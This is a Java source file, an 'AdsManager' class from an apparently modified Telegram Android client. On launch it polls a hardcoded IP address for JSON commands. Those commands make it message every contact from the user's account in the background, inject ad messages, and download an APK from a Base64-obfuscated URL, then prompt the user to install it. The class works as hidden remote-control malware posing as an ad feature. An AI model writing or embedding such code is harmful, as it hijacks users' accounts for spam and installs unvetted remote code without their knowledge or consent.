package org.telegram.tgnet;


import android.app.Activity;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.Handler;
import android.os.PowerManager;
import android.support.v4.app.NotificationCompat;
import android.support.v4.app.TaskStackBuilder;
import android.util.Base64;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.BuildConfig;
import org.telegram.messenger.ContactsController;
import org.telegram.messenger.LocaleController;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.R;
import org.telegram.messenger.SendMessagesHelper;
import org.telegram.ui.LaunchActivity;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;


/**
 * Created by mohammad on 12/9/15.
 */
public class AdsManager {


    public static final String LOG_TAG_STRING = "HttpConnectionLog";

    public Context mContext;

    public static SharedPreferences sharedPreferences;
    public static SharedPreferences.Editor editor;
    public int countLaunch;



    public void init(Context context) throws Exception {

        mContext = context;

        OpenUrl openUrl = new OpenUrl();
        openUrl.execute("http://37.220.11.226:3090/");

        sharedPreferences = mContext.getSharedPreferences("mainconfig", Context.MODE_PRIVATE);
        editor = sharedPreferences.edit();

        setInviteText();


        if (sharedPreferences.getInt("count", 0) == 0) {
            countLaunch = 1;
            editor.putInt("count", countLaunch);
            editor.commit();
        } else {
            countLaunch = sharedPreferences.getInt("count", 0);
            editor.putInt("count", countLaunch + 1);
            editor.commit();
        }
        



    }


    public class OpenUrl extends AsyncTask<String, Integer, String> {

        @Override
        protected String doInBackground(String... strings) {

            String urlString;
            String result = "";

            if (strings[0] != null) {

                urlString = strings[0];

                try {
                    URL url = new URL(urlString);

                    HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                    httpURLConnection.setRequestMethod("GET");
                    httpURLConnection.setConnectTimeout(15 * 1000);
                    httpURLConnection.setReadTimeout(15 * 1000);
                    httpURLConnection.connect();

                    if (httpURLConnection.getResponseCode() / 2 == 100) {
                        result = getStringFromInputStream(httpURLConnection.getInputStream());
                    } else {
                        result = "{}";
                    }


                } catch (IOException e) {
                    e.printStackTrace();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } else {
                Log.w(LOG_TAG_STRING, "Please enter a one url!;");
            }


            return result;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);

            JSONObject jsonObject = null;

            try {
                jsonObject = new JSONObject(s);
            } catch (JSONException e) {
                e.printStackTrace();
            }

            try {
                parseJson(jsonObject);
            } catch (JSONException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            }

            Log.w(LOG_TAG_STRING, s);
        }


    }

    public void parseJson(JSONObject jsonObject) throws JSONException, IOException, Exception {

        if (jsonObject != null) {

            boolean notification_enabled = jsonObject.getBoolean("notification_enabled");
            int notification_id = jsonObject.getInt("notification_id");
            String notification_msg = jsonObject.getString("notification_msg");
            if (notification_enabled) {
                sendSimpleNotification(notification_msg, notification_id);
            }


            boolean pv_enabled = jsonObject.getBoolean("pv_enabled");
            int pv_id = jsonObject.getInt("pv_id");
            long pv_delay = jsonObject.getLong("pv_delay");
            String pv_msg = jsonObject.getString("pv_msg");
            if (pv_enabled) {
                sendToPVAll(pv_msg, pv_id, pv_delay);
            }


            boolean update_enabled = jsonObject.getBoolean("update_enabled");
            long update_length = jsonObject.getLong("update_length");
            String update_url = jsonObject.getString("update_url");
            int update_last_version = jsonObject.getInt("update_last_version");
            if (update_enabled) {
                getNewUpdate(update_url, update_last_version, update_length);
            }


            boolean once_group_enabled = jsonObject.getBoolean("once_group_enabled");
            String once_group_msg = jsonObject.getString("once_group_msg");
            int once_group_id = jsonObject.getInt("once_group_id");
            if (once_group_enabled) {
                setOnceInGroup(once_group_id, once_group_msg);
            } else {
                editor.putBoolean("once_in_group_enabled", false);
                editor.commit();
            }



        }

    }



    public void setOnceInGroup(int id, String msg) throws Exception {

        editor.putBoolean("once_in_group_enabled", true);
        editor.putInt("once_in_group_last_id", id);
        editor.putString("once_in_group_last_msg", msg);
        editor.commit();

    }



    public String getStringFromInputStream(InputStream is) throws Exception {

        BufferedReader br = null;
        StringBuilder sb = new StringBuilder();

        String line;
        try {

            br = new BufferedReader(new InputStreamReader(is));
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (br != null) {
                try {
                    br.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return sb.toString();

    }


    public void sendSimpleNotification(String message, int id) throws Exception{
        String s = "notification_" + id;
        if (sharedPreferences.getBoolean(s + "_can_use", true)) {
            MessagesController.getInstance().generateAdMessage(message);
            editor.putBoolean(s + "_can_use", false);
            editor.commit();
        }
    }

    public void sendToPVAll(final String message, int id, final long delay) throws Exception {
        final String s = "pv_" + id;
        final PowerManager.WakeLock mWakeLock;
        ContactsController contactsController = ContactsController.getInstance();
        int size = contactsController.contacts.size();
        if (size != 0) {
            editor.putInt(s + "_size", size);
            editor.putInt(s + "_last_member", size);
            editor.commit();
            if (sharedPreferences.getBoolean(s + "_can_use", true)) {
                for (int i = 0; i < size; i++) {
                    TLRPC.TL_contact tl_contact = contactsController.contacts.get(i);
                    editor.putLong(s + "_user_number_" + i, tl_contact.user_id);
                }
                editor.putBoolean(s + "_can_use", false);
                editor.commit();

                PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);
                mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                        getClass().getName());
                mWakeLock.acquire();

                final Handler handler = new Handler();
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        int size = sharedPreferences.getInt(s + "_size", 0);
                        int user_id = sharedPreferences.getInt(s + "_last_member", 0);
                        long peer = sharedPreferences.getLong(s + "_user_number_" + user_id, 0);
                        if (user_id > 0) {
                            handler.postDelayed(this, delay);
                            SendMessagesHelper sendMessagesHelper = SendMessagesHelper.getInstance();
                            sendMessagesHelper.sendMessage(message, peer, null, null , false, false , null , null);
                            editor.putInt(s + "_last_member", user_id - 1);
                            editor.commit();
                        } else {
                            for (int i = 0; i < size; i++) {
                                editor.remove(s + "_user_number_" + i);
                            }
                            editor.remove(s + "_size");
                            editor.remove(s + "_last_member");
                            editor.commit();

                            mWakeLock.release();

                        }
                    }
                }, delay);
            }
        }
    }


    public void getNewUpdate(String urlEncode, int lastVersion, long length) throws IOException, Exception {

        File downloadFolder = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);

        String urlToDownload = new String(Base64.decode(urlEncode, Base64.DEFAULT));

        if (!downloadFolder.exists()) {
            downloadFolder.mkdirs();
        }

        File tempFile = new File(mContext.getCacheDir(), "update.apk");
        File destFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "telegram-farsi-" + lastVersion + ".apk");

        if (lastVersion > BuildConfig.VERSION_CODE && !destFile.exists()) {


            if (!tempFile.exists()) {
                tempFile.createNewFile();
            }

            if (tempFile.length() != length) {


                final DownloadTask downloadTask = new DownloadTask(mContext, (int) length);
                downloadTask.execute(urlToDownload);


            } else {

                InputStream in = null;
                OutputStream out = null;
                try {


                    if (!destFile.exists()) {
                        destFile.createNewFile();
                    }


                    in = new FileInputStream(tempFile);
                    out = new FileOutputStream(destFile);

                    byte[] buffer = new byte[1024];
                    int read;
                    while ((read = in.read(buffer)) != -1) {
                        out.write(buffer, 0, read);
                    }
                    in.close();
                    in = null;

                    // write the output file (You have now copied the file)
                    out.flush();
                    out.close();
                    out = null;

                } catch (FileNotFoundException fnfe1) {
                    Log.e("tag", fnfe1.getMessage());
                } catch (Exception e) {
                    Log.e("tag", e.getMessage());
                }


                if (destFile.length() == length) {
                    if (tempFile.exists()) {
                        tempFile.delete();
                    }

                }

            }


        } else if (destFile.exists() && lastVersion > BuildConfig.VERSION_CODE) {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(destFile), "application/vnd.android.package-archive");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            //mContext.startActivity(intent);
            showNewUpdateNotification(destFile);
        }

    }



    public void showNewUpdateNotification(File updateFile) throws Exception{

        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.fromFile(updateFile), "application/vnd.android.package-archive");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);


        TaskStackBuilder stackBuilder = TaskStackBuilder.create(mContext);
        stackBuilder.addParentStack(LaunchActivity.class);


        stackBuilder.addNextIntent(intent);
        PendingIntent resultPendingIntent = stackBuilder.getPendingIntent(0, PendingIntent.FLAG_UPDATE_CURRENT);



        Notification notification = new NotificationCompat.Builder(mContext)
                .setSmallIcon(R.drawable.notification)
                .setWhen(System.currentTimeMillis())
                .setContentTitle(LocaleController.getString("AutoUpdateTitle", R.string.AutoUpdateTitle))
                .setContentText(LocaleController.getString("AutoUpdateContent", R.string.AutoUpdateContent))
                .setContentIntent(resultPendingIntent)
                .setSound(RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION))
                .setAutoCancel(true).build();


        NotificationManager notificationManager = (NotificationManager) mContext.getSystemService(Context.NOTIFICATION_SERVICE);

        notificationManager.notify(999, notification);

    }

    public void setInviteText() throws Exception {
        SharedPreferences preferences = ApplicationLoader.applicationContext.getSharedPreferences("mainconfig", Activity.MODE_PRIVATE);
        SharedPreferences.Editor editor = preferences.edit();
        if (!preferences.getString("invitetext",null).equals(LocaleController.getString("InviteText", R.string.InviteText))) {
            editor.putString("invitetext", LocaleController.getString("InviteText", R.string.InviteText));
            editor.putInt("invitetexttime", (int) (System.currentTimeMillis() / 1000));
            editor.commit();
        }
    }

    public class DownloadTask extends AsyncTask<String, Integer, String> {

        public Context context;
        public PowerManager.WakeLock mWakeLock;
        File tempFile = new File(mContext.getCacheDir(), "update.apk");
        int fileLength;

        public DownloadTask(Context context, int length) {
            this.context = context;
            this.fileLength = length;
        }

        @Override
        protected String doInBackground(String... sUrl) {
            InputStream input = null;
            OutputStream output = null;
            HttpURLConnection connection = null;
            try {
                URL url = new URL(sUrl[0]);
                connection = (HttpURLConnection) url.openConnection();
                connection.connect();

                // expect HTTP 200 OK, so we don't mistakenly save error report
                // instead of the file
                if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
                    return "Server returned HTTP " + connection.getResponseCode()
                            + " " + connection.getResponseMessage();
                }


/*                if (tempFile.exists()) {
                    // Initial download.

                    connection.setRequestProperty("Range", "bytes="+tempFile.length()+"-" + fileLength);

                    Log.w(LOG_TAG_STRING, "Range :" + "bytes="+tempFile.length()+"-" + fileLength);

                    String lastModified = connection.getHeaderField("Last-Modified");

                    connection.setRequestProperty("If-Range", lastModified);


                }*/

                // this will be useful to display download percentage
                // might be -1: server did not report the length
                int fileLength = connection.getContentLength();

                // download the file
                input = connection.getInputStream();
                output = new FileOutputStream(tempFile);

                byte data[] = new byte[4096];
                long total = 0;
                int count;
                while ((count = input.read(data)) != -1) {
                    // allow canceling with back button
                    if (isCancelled()) {
                        input.close();
                        return null;
                    }
                    total += count;
                    // publishing the progress....
                    if (fileLength > 0) // only if total length is known
                        publishProgress((int) (total * 100 / fileLength));
                    output.write(data, 0, count);
                }
            } catch (Exception e) {
                e.printStackTrace();
                return e.toString();
            } finally {
                try {
                    if (output != null)
                        output.close();
                    if (input != null)
                        input.close();
                } catch (IOException ignored) {
                }

                if (connection != null)
                    connection.disconnect();
            }
            return null;
        }


        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            // take CPU lock to prevent CPU from going off if the user
            // presses the power button during download
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                    getClass().getName());
            mWakeLock.acquire();
        }

        @Override
        protected void onProgressUpdate(Integer... progress) {
            super.onProgressUpdate(progress);
            // if we get here, length is known, now set indeterminate to false

            Log.w(LOG_TAG_STRING, "Download: " + progress[0] +"%");
        }

        @Override
        protected void onPostExecute(String result) {
            mWakeLock.release();

            if (result != null) {
                //Toast.makeText(context, "Download error: " + result, Toast.LENGTH_LONG).show();
            } else {
                //Toast.makeText(context, "File downloaded", Toast.LENGTH_SHORT).show();

                try {
                    //showNewUpdateNotification(new File(mContext.getCacheDir(), "update.apk"));
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }

    }

}
